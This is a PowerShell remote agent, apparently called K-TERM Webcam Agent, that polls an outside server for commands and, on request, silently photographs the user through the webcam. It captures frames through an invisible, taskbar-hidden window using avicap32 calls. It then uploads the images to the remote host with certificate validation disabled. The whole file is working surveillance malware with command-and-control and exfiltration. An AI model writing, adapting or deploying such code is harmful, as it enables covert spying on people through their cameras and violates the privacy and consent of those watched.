param(
    [string]$ServerURL = "https://kotukole.com/lap",
    [string]$AgentID = "PC-01"
)

$ServerURL = $ServerURL.TrimEnd('/')
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

Write-Host "=================================================================" -ForegroundColor Cyan
Write-Host "        📷 K-TERM WEBCAM AGENT (WINDOWS CLIENT) 📷              " -ForegroundColor Cyan
Write-Host "=================================================================`n" -ForegroundColor Cyan
Write-Host "[*] Connecting to Server : $ServerURL"
Write-Host "[*] Agent Identifier     : $AgentID"
Write-Host "`n[+] Status: LISTENING for webcam capture commands...`n" -ForegroundColor Green

# Function to capture photo from webcam using Windows API
Function Capture-Webcam {
    $cams = Get-CimInstance Win32_PnPEntity -Filter "PNPClass='Camera' or PNPClass='Image'" -ErrorAction SilentlyContinue
    if (-not $cams) {
        Write-Host "[-] No camera hardware detected on this PC." -ForegroundColor Yellow
        return $null
    }

    $tempFile = "$env:TEMP\webcam_capture_$([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()).jpg"
    
    $code = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.Windows.Forms;

    public class WebCamCapture {
        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
        public static extern IntPtr capCreateCaptureWindowA(string name, int style, int x, int y, int w, int h, IntPtr hWnd, int id);
        [DllImport("user32.dll")] public static extern IntPtr SendMessage(IntPtr hWnd, int msg, int wParam, int lParam);
        [DllImport("user32.dll")] public static extern IntPtr SendMessage(IntPtr hWnd, int msg, int wParam, [MarshalAs(UnmanagedType.LPStr)] string lParam);
        [DllImport("user32.dll")] public static extern bool DestroyWindow(IntPtr hWnd);

        public static bool Capture(string filePath, int cameraIndex) {
            Form f = new Form();
            f.Size = new Size(640, 480);
            f.ShowInTaskbar = false;
            f.FormBorderStyle = FormBorderStyle.None;
            f.Opacity = 0;
            f.Show();
            Application.DoEvents();

            IntPtr hWnd = capCreateCaptureWindowA("Webcam", 0x40000000 | 0x10000000, 0, 0, 640, 480, f.Handle, 1);
            if (hWnd == IntPtr.Zero) { f.Close(); return false; }

            IntPtr conn = SendMessage(hWnd, 0x0400 + 10, cameraIndex, 0);
            if (conn == IntPtr.Zero) {
                DestroyWindow(hWnd);
                f.Close();
                return false;
            }

            SendMessage(hWnd, 0x0400 + 50, 1, 0);
            SendMessage(hWnd, 0x0400 + 52, 30, 0);
            for (int i = 0; i < 15; i++) {
                Application.DoEvents();
                System.Threading.Thread.Sleep(100);
            }

            SendMessage(hWnd, 0x0400 + 60, 0, 0);
            Application.DoEvents();
            System.Threading.Thread.Sleep(200);

            string bmpPath = filePath + ".bmp";
            SendMessage(hWnd, 0x0400 + 25, 0, bmpPath);
            Application.DoEvents();

            SendMessage(hWnd, 0x0400 + 11, 0, 0);
            DestroyWindow(hWnd);
            f.Close();

            if (System.IO.File.Exists(bmpPath)) {
                try {
                    using (Image img = Image.FromFile(bmpPath)) {
                        img.Save(filePath, ImageFormat.Jpeg);
                    }
                    System.IO.File.Delete(bmpPath);
                    return true;
                } catch { return false; }
            }
            return false;
        }
    }
"@

    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
    Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing, System.Windows.Forms -ErrorAction SilentlyContinue

    # Try available camera indices (0 = Primary, 1 = Secondary / External USB, 2 = Tertiary)
    for ($i = 0; $i -le 2; $i++) {
        $result = [WebCamCapture]::Capture($tempFile, $i)
        if ($result -and (Test-Path $tempFile)) {
            return $tempFile
        }
    }
    return $null
}

# Function to upload photo to K-Term server
Function Upload-Photo($url, $filePath) {
    if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
        $out = curl.exe -s -X POST -F "webcamPhoto=@$filePath" "$url/api/upload-webcam"
        return $out
    }
    try {
        Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue
        $httpClient = New-Object System.Net.Http.HttpClient
        $multipart = New-Object System.Net.Http.MultipartFormDataContent
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $byteContent = New-Object System.Net.Http.ByteArrayContent($fileBytes, 0, $fileBytes.Length)
        $multipart.Add($byteContent, "webcamPhoto", [System.IO.Path]::GetFileName($filePath))
        $response = $httpClient.PostAsync("$url/api/upload-webcam", $multipart).Result
        return $response.Content.ReadAsStringAsync().Result
    } catch {
        return "[Upload Error]: " + $_.Exception.Message
    }
}

while ($true) {
    try {
        # Poll server for queued commands
        $response = Invoke-RestMethod -Uri "$ServerURL/api/poll" -Method Get -TimeoutSec 10 -ErrorAction Stop
        
        if ($response -and $response.command -eq "webcam") {
            $timeNow = (Get-Date).ToString("HH:mm:ss")
            Write-Host "[$timeNow] [CMD] Webcam photo requested! Capturing frame..." -ForegroundColor Yellow
            $imgPath = Capture-Webcam
            
            if ($imgPath) {
                Write-Host "[$timeNow] [CAPTURE] Frame grabbed. Uploading to $ServerURL..." -ForegroundColor Cyan
                $uploadResult = Upload-Photo -url $ServerURL -filePath $imgPath
                Write-Host "[$timeNow] [SUCCESS] Upload complete: $uploadResult" -ForegroundColor Green
                Remove-Item $imgPath -Force -ErrorAction SilentlyContinue
            } else {
                Write-Host "[$timeNow] [WARNING] Failed to capture image. Please verify camera is connected." -ForegroundColor Red
            }
        }
    } catch {
        # Retry quietly on network blips
    }
    Start-Sleep -Seconds 2
}
